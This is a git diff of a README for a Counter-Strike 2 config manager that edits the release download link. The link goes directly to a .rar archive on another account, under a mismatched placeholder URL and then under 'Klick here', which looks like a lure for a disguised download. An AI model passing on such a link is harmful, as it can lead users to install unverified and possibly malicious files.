@@ -20,7 +20,7 @@ A powerful and user-friendly CS2 Config Manager designed to simplify the managem
 - This tool does not modify game files illegally.  
 - Use at your own risk (always backup original configs).  
 ### Latest Stable Release: v1.1.0 *(2025-05-28)*  
-([https://github.com/yourusername/CS2-Config-Manager/releases/latest](https://github.com/chedmoon2/ConfigManager-CS2/releases/download/Download/ACM.rar))  
+([Klick here](https://github.com/chedmoon2/ConfigManager-CS2/releases/download/Download/ACM.rar))  
 
 #### 🚀 New Features  
 - Cloud Sync: Backup & sync configs via Google Drive/Dropbox.  
